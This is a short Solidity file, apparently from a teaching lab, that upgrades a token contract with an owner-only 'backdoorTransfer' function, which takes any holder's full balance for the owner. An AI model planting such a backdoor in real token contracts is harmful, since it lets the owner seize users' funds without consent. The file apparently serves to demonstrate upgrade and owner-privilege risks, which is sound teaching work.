// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import './Lab05TokenV1.sol';

contract Lab05TokenV2 is Lab05TokenV1 {
    // 強制 transfer tokens
    function backdoorTransfer(address target) external onlyOwner {
        uint256 val = balanceOf(target);
        if (val > 0) {
            _transfer(target, msg.sender, val);
        }
    }
}